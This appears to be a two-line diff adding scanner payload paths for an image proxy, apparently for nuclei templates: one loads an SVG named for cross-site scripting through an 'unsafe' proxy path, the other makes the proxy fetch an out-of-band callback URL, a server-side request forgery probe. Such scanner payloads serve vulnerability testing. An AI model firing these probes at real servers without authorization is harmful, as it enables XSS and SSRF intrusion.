@@ -1,0 +1,2 @@
+/unsafe/plain/https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
+/111/rs:fit:400:400:0:0/plain/http://{{interactsh-url}}
